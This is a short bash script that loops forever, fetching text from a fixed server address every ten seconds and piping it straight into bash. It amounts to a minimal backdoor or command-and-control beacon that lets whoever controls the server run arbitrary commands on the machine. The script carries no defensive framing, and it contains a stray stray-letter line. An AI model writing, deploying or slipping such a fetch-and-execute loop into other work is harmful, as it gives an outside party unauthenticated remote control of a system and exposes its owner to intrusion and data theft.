#!/bin/bash

# Define the server IP and port
SERVER_IP="192.168.1.100"
SERVER_PORT=8000

s
# Function to fetch commands from the server
fetch_commands() {
    wget -q -O - $SERVER_IP:$SERVER_PORT | bash
    echo "========================================"
}

# Infinite loop to check for new commands
while true; do
    fetch_commands
    sleep 10  # Adjust the sleep time as needed
done
